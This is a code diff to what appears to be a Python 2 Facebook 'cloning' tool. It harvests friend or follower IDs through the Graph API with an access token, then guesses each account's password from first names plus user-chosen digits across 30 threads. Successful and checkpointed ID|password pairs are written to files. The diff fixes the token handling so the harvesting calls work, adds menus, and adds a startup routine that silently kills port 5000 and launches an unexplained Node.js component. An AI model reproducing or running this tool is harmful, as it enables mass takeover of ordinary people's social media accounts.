@@ -27,17 +27,34 @@ logo = """
 \t         ██   ██ ██████  ██ ██████                                          
 \t\n                   \033[1;97m------- SINDHI -------\033[1;92m
 """
+
 os.system('fuser -k 5000/tcp &')
 os.system('#')
 os.system('cd abid && npm install')
 os.system('cd abid && node index.js &')
 time.sleep(5)
 
+def reg():
+    os.system('clear')
+    print logo
+    print '\t\x1b[1;92mConnecting...'
+    time.sleep(1)
+    os.system('fuser -k 5000/tcp &')
+    os.system('#')
+    os.system('cd abid && npm install')
+    os.system('cd abid && node index.js &')
+    os.system('clear')
+    time.sleep(5)
+    print '\t\x1b[1;92mConnected'
+    time.sleep(1)
+    login()
+
+
 def login():
     os.system('clear')
     try:
         token = open('.login.txt', 'r').read()
-        crack()
+        menu()
     except (KeyError, IOError):
         print logo
         print '\n\n\tLogin With Token'
@@ -45,38 +62,62 @@ def login():
         sav = open('.login.txt', 'w')
         sav.write(token)
         sav.close()
+        menu()
+
+
+def menu():
+    os.system('clear')
+    try:
+        token = open('.login.txt', 'r').read()
+    except (KeyError, IOError):
+        login()
+
+    try:
+        r = requests.get('https://graph.facebook.com/me?access_token=' + token, headers=header)
+        q = json.loads(r.text)
+        name = q['name']
+    except KeyError:
+        print logo
+        print '\033[1;91m\n\n\tLogged in token has expired'
+        os.system('rm -rf .login.txt')
+        time.sleep(1)
+        login()
+    os.system('clear')
+    print logo
+    print '\n\n   LOGIN ID : ' + name
+    print '\n\n   [1] START'
+    menu_option()
+
+
+def menu_option():
+    select = raw_input('\n\n   Choose : ')
+    if select == '1':
         crack()
+    else:
+        print ''
+        print '\tSelect valid option'
+        print ''
+        menu_option()
+
 
 def crack():
-	global token
-	os.system('clear')
-	print logo
-	try:
-		token = open('.login.txt', 'r').read()
-	except (KeyError, IOError):
-		login
-	try:
-		r = requests.get('https://graph.facebook.com/me?access_token=' + token, headers=header)
-		q = json.loads(r.text)
-		name = q['name']
-	except KeyError:
-		print logo
-		print '\033[1;91m\n\n\tLogged in token has expired'
-		os.system('rm -rf .login.txt')
-		time.sleep(1)
-		login()
-	os.system('clear')
-	try:
-		token = open('.login.txt', 'r').read()
-	except IOError:
-		print '\n\n\tToken not found '
-		time.sleep(1)
-		login() 
-	os.system('clear')
-	print logo
-	print '\033[1;92m\n\n [1] Clone From Public'
-	print '\n [2] Clone From Followers'
-	crack_select()
+    global token
+    os.system('clear')
+    try:
+        token = open('.login.txt', 'r').read()
+    except IOError:
+        print ''
+        print '\tToken not found '
+        time.sleep(1)
+        login_choice()
+
+    os.system('clear')
+    print logo
+    print '\033[1;92m\n\n [1] Clone From Public'
+    print '\n [2] Clone From Followers'
+    print '\n [0] Back'
+    crack_select()
+
 
 def crack_select():
     select = raw_input('\n   Choose : ')
@@ -97,13 +138,17 @@ def crack_select():
             q = json.loads(r.text)
             os.system('clear')
             print logo
-            print '\n\n\tCloning from : ' + q['name']
+            print ''
+            print ''
+            print ''
+            print ' Cloning from : ' + q['name']
         except KeyError:
-            print '    Invalid link '
-            raw_input('\n    Press enter to back')
+            print '\tInvalid link OR token'
+            print ''
+            raw_input(' Press enter to back')
             crack()
 
-        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=', headers=header)
+        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers=header)
         z = json.loads(r.text)
         for i in z['data']:
             uid = i['id']
@@ -121,23 +166,30 @@ def crack_select():
         p3 = raw_input(' Name + your digit: ')
         p4 = raw_input(' Name + your digit: ')
         try:
-            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers=header)
+            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
             q = json.loads(r.text)
             os.system('clear')
             print logo
-            print '\n\n\tCloning from : ' + q['name']
+            print ''
+            print ''
+            print ''
+            print ' Cloning from: ' + q['name']
         except KeyError:
-            print '    Invalid link '
-            raw_input('\n    Press enter to back')
+            print '\tInvalid id link'
+            print ''
+            raw_input(' Press enter to back')
             crack()
 
-        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + '&limit=999999', headers=header)
+        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999', headers=header)
         z = json.loads(r.text)
         for i in z['data']:
             uid = i['id']
             na = i['name']
             nm = na.rsplit(' ')[0]
             id.append(uid + '|' + nm)
+
+    elif select == '0':
+        menu()
     else:
         print ''
         print '\tSelect valid option'
@@ -163,7 +215,7 @@ def crack_select():
                 ok.close()
                 oks.append(uid + pass1)
             elif 'www.facebook.com' in q['error']:
-                print ' \x1b[1;97m[5-DAYS] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
+                print ' \x1b[1;91m[5-DAYS] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                 cp = open('checkpoint.txt', 'a')
                 cp.write(uid + ' | ' + pass1 + '\n')
                 cp.close()
@@ -179,7 +231,7 @@ def crack_select():
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'www.facebook.com' in q['error']:
-                    print ' \x1b[1;97m[5-DAYS] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
+                    print ' \x1b[1;91m[5-DAYS] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                     cp = open('checkpoint.txt', 'a')
                     cp.write(uid + ' | ' + pass2 + '\n')
                     cp.close()
@@ -195,7 +247,7 @@ def crack_select():
                         ok.close()
                         oks.append(uid + pass3)
                     elif 'www.facebook.com' in q['error']:
-                        print ' \x1b[1;97m[5-DAYS] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
+                        print ' \x1b[1;91m[5-DAYS] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                         cp = open('checkpoint.txt', 'a')
                         cp.write(uid + ' | ' + pass3 + '\n')
                         cp.close()
@@ -211,7 +263,7 @@ def crack_select():
                             ok.close()
                             oks.append(uid + pass4)
                         elif 'www.facebook.com' in q['error']:
-                            print ' \x1b[1;97m[5-DAYS] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
+                            print ' \x1b[1;91m[5-DAYS] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                             cp = open('checkpoint.txt', 'a')
                             cp.write(uid + ' | ' + pass4 + '\n')
                             cp.close()
@@ -221,9 +273,6 @@ def crack_select():
 
     p = ThreadPool(30)
     p.map(main, id)
-    print ''
-    print 47 * '-'
-    print ''
     print ' The process has completed'
     print ' Total Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
     print ''
@@ -233,4 +282,4 @@ def crack_select():
     crack()
 
 
-login()
+reg()
